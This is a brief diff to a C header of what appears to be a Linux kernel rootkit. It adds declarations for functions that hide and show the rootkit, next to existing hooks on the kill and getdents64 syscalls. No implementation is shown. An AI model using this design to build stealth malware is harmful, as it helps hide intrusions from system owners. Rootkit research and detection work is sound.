@@ -33,6 +33,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs);
 asmlinkage int hook_getdents64(const struct pt_regs *regs);
 
 
+//Functions for hiding and showing the rootkit
+void hide_rootkit(void);
+void show_rootkit(void);
+
+
 void remove_all_hooks(void);
 int install_all_hooks(void);
 
